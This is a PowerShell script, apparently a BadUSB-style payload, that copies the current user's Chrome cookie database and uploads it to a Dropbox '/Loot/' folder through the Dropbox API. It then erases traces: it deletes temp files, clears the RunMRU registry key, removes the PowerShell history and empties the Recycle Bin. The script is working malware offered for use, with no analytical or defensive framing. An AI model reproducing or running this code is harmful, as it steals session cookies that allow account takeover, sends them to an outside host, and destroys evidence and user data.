$cookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
$filePath = "$env:temp\Cookies"
$destinationPath = "/Loot/$env:USERNAME/Cookies"

Copy-Item -Path $cookiesPath -Destination $filePath -Force

try {
    $headers = @{
        "Authorization" = "Bearer $db"
        "Content-Type" = "application/octet-stream"
        "Dropbox-API-Arg" = '{"path": "' + $destinationPath + '", "mode": "add", "autorename": true, "mute": false}'
    }

    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $url = "https://content.dropboxapi.com/2/files/upload"

    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $filePath -ContentType "application/octet-stream"

    Write-Host "File uploaded to Dropbox successfully."
}
catch {
    Write-Host "Error occurred while uploading the file: $_" -ForegroundColor Red
}

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
